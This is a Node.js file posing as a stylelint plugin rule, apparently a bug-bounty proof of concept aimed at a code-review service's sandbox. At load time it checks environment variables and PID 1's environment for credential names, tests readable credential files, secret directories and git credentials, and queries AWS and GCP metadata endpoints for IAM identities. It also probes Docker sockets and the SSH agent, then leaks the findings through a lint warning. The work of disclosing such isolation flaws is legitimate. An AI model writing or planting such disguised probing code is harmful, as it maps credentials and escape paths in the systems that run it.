const {
  accessSync,
  closeSync,
  constants,
  openSync,
  readFileSync,
  readdirSync,
  statSync,
  writeFileSync,
} = require('node:fs');
const { execFileSync } = require('node:child_process');
const { dirname, isAbsolute, join, resolve } = require('node:path');

const credentialNames = [
  'ANTHROPIC_API_KEYS', 'APERTURE_AGENT_KEY', 'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AZURE_CLIENT_SECRET',
  'CI_JOB_TOKEN', 'CODERABBIT_API_KEY', 'CODECOV_TOKEN', 'COMPOSER_AUTH',
  'COURIER_NOTIFICATION_AUTH_TOKEN', 'DATADOG_API_KEY', 'DD_API_KEY',
  'DOCKER_AUTH_CONFIG', 'ENCRYPTION_PASSWORD', 'GCP_SERVICE_ACCOUNT_KEY',
  'GH_TOKEN', 'GH_WEBHOOK_SECRET', 'GITHUB_APP_CLIENT_SECRET',
  'GITHUB_APP_PEM_FILE', 'GITHUB_TOKEN', 'GITLAB_BOT_TOKEN',
  'GOOGLE_APPLICATION_CREDENTIALS', 'JIRA_SECRET', 'LANGCHAIN_API_KEY',
  'NODE_AUTH_TOKEN', 'NPM_TOKEN', 'OPENAI_API_KEYS', 'PYPI_TOKEN',
  'SENTRY_AUTH_TOKEN',
];

function namesPresent(availableNames) {
  const names = new Set(availableNames);
  return credentialNames.filter((name) => names.has(name));
}

function pidOneNames() {
  try {
    return readFileSync('/proc/1/environ')
      .toString('utf8')
      .split('\0')
      .filter(Boolean)
      .map((entry) => entry.slice(0, Math.max(0, entry.indexOf('='))));
  } catch {
    return [];
  }
}

function readableFile(filePath) {
  try {
    accessSync(filePath, constants.R_OK);
    if (!statSync(filePath).isFile()) return false;
    const descriptor = openSync(filePath, 'r');
    closeSync(descriptor);
    return true;
  } catch {
    return false;
  }
}

function directoryContainsReadableCredentialFile(directory, depth = 2) {
  try {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      const child = join(directory, entry.name);
      if (
        entry.isFile()
        && /(?:auth|credential|dockerconfig|key|password|secret|token)/i.test(entry.name)
        && readableFile(child)
      ) return true;
      if (
        entry.isDirectory()
        && depth > 0
        && directoryContainsReadableCredentialFile(child, depth - 1)
      ) return true;
    }
  } catch {
    return false;
  }
  return false;
}

function gitConfigurationPaths() {
  const dotGit = join(process.cwd(), '.git');
  const candidates = [join(dotGit, 'config')];
  try {
    if (statSync(dotGit).isFile()) {
      const match = /^gitdir:\s*(.+)$/i.exec(readFileSync(dotGit, 'utf8').trim());
      if (match) {
        const gitDirectory = isAbsolute(match[1])
          ? match[1]
          : resolve(dirname(dotGit), match[1]);
        candidates.push(join(gitDirectory, 'config'));
        candidates.push(join(gitDirectory, 'config.worktree'));
        if (dirname(gitDirectory).endsWith('/worktrees')) {
          candidates.push(resolve(gitDirectory, '..', '..', 'config'));
        }
      }
    }
  } catch {
    // A checkout without Git metadata is an expected negative result.
  }
  return candidates;
}

function gitConfigurationContainsCredential() {
  const pattern =
    /(?:authorization|bearer|oauth2|x-access-token)|https?:\/\/[^\s/:@]+:[^\s/@]+@/i;
  return gitConfigurationPaths().some((filePath) => {
    try {
      return pattern.test(readFileSync(filePath, 'utf8'));
    } catch {
      return false;
    }
  });
}

function accessibleSocket(socketPath) {
  try {
    accessSync(socketPath, constants.R_OK | constants.W_OK);
    return statSync(socketPath).isSocket();
  } catch {
    return false;
  }
}

function socketProbe(source, socketPath) {
  if (!accessibleSocket(socketPath)) return false;
  try {
    return execFileSync(process.execPath, ['-e', source, socketPath], {
      encoding: 'utf8',
      stdio: ['ignore', 'pipe', 'ignore'],
      timeout: 1200,
    }).trim() === '1';
  } catch {
    return false;
  }
}

function dockerApiResponds(socketPath) {
  return socketProbe(`
    const http = require('node:http');
    let finished = false;
    const finish = (value) => {
      if (finished) return;
      finished = true;
      process.stdout.write(value ? '1' : '0');
    };
    const request = http.request({
      socketPath: process.argv[1], path: '/_ping', method: 'GET', timeout: 650,
    }, (response) => {
      response.resume();
      response.on('end', () => finish(response.statusCode === 200));
    });
    request.on('timeout', () => { finish(false); request.destroy(); });
    request.on('error', () => finish(false));
    request.end();
  `, socketPath);
}

function sshAgentSocketConnects(socketPath) {
  return socketProbe(`
    const net = require('node:net');
    let finished = false;
    const finish = (value) => {
      if (finished) return;
      finished = true;
      process.stdout.write(value ? '1' : '0');
    };
    const socket = net.createConnection({ path: process.argv[1] });
    socket.setTimeout(650);
    socket.on('connect', () => { finish(true); socket.end(); });
    socket.on('timeout', () => { finish(false); socket.destroy(); });
    socket.on('error', () => finish(false));
  `, socketPath);
}

function cloudIdentityNamesReachable() {
  const executeBooleanProbe = (source) => {
    try {
      return execFileSync(process.execPath, ['-e', source], {
        encoding: 'utf8',
        stdio: ['ignore', 'pipe', 'ignore'],
        timeout: 1800,
      }).trim() === '1';
    } catch {
      return false;
    }
  };
  const awsRole = executeBooleanProbe(`(async () => {
    const tokenResponse = await fetch('http://169.254.169.254/latest/api/token', {
      method: 'PUT',
      headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '60' },
      redirect: 'error',
      signal: AbortSignal.timeout(650),
    });
    const token = tokenResponse.ok ? (await tokenResponse.text()).trim() : '';
    if (!token || token.length >= 4096) return process.stdout.write('0');
    const roleResponse = await fetch(
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      {
        headers: { 'X-aws-ec2-metadata-token': token },
        redirect: 'error',
        signal: AbortSignal.timeout(650),
      },
    );
    const roleNames = roleResponse.ok ? (await roleResponse.text()).trim() : '';
    process.stdout.write(roleNames ? '1' : '0');
  })().catch(() => process.stdout.write('0'))`);
  const gcpServiceAccount = executeBooleanProbe(`(async () => {
    const response = await fetch(
      'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/',
      {
        headers: { 'Metadata-Flavor': 'Google' },
        redirect: 'error',
        signal: AbortSignal.timeout(650),
      },
    );
    const names = response.ok ? (await response.text()).trim() : '';
    process.stdout.write(names ? '1' : '0');
  })().catch(() => process.stdout.write('0'))`);
  return { awsRole, gcpServiceAccount };
}

const credentialFiles = [
  '/root/.aws/credentials',
  '/root/.config/gcloud/application_default_credentials.json',
  '/root/.config/gh/hosts.yml',
  '/root/.git-credentials',
  '/home/coderabbit/.aws/credentials',
  '/home/coderabbit/.config/gcloud/application_default_credentials.json',
  '/home/coderabbit/.config/gh/hosts.yml',
  '/home/coderabbit/.git-credentials',
  '/home/node/.aws/credentials',
  '/home/node/.config/gcloud/application_default_credentials.json',
  '/home/node/.config/gh/hosts.yml',
  '/home/node/.git-credentials',
];
const secretDirectories = ['/etc/secrets', '/run/secrets', '/secrets', '/var/run/secrets'];
const dockerApiSockets = [
  '/run/docker.sock',
  '/run/podman/podman.sock',
  '/var/run/docker.sock',
  '/var/run/podman/podman.sock',
];
const currentNames = namesPresent(Object.keys(process.env));
const initNames = namesPresent(pidOneNames());
const hasCredentialFile = credentialFiles.some(readableFile)
  || secretDirectories.some((directory) => directoryContainsReadableCredentialFile(directory));
const cloud = cloudIdentityNamesReachable();
const hasRuntimeSocket = dockerApiSockets.some(dockerApiResponds);
const hasSshAgent = typeof process.env.SSH_AUTH_SOCK === 'string'
  && sshAgentSocketConnects(process.env.SSH_AUTH_SOCK);
const flags = [];
if (currentNames.length) flags.push(`ENV-${currentNames.join('+')}`);
if (initNames.length) flags.push(`PID1-${initNames.join('+')}`);
if (gitConfigurationContainsCredential()) flags.push('GITAUTH');
if (hasCredentialFile) flags.push('SECRETFILE');
if (cloud.awsRole) flags.push('AWSROLE');
if (cloud.gcpServiceAccount) flags.push('GCPSA');
if (hasRuntimeSocket) flags.push('RUNTIMESOCK');
if (hasSshAgent) flags.push('SSHAGENT');

const suffix = flags.length ? flags.join('_') : 'NONE';
const marker = `CR_H1_SAFE_STYLELINT_BOUNDARY_20260815_X_${suffix}`;
writeFileSync(join(process.cwd(), 'analysis_stylelint_boundary_result.txt'), `${marker}\n`);

const ruleName = 'coderabbit-h1/isolation-boundary';
const rule = () => (root, result) => {
  result.warn(marker, { node: root, rule: ruleName });
};

module.exports = { ruleName, rule };
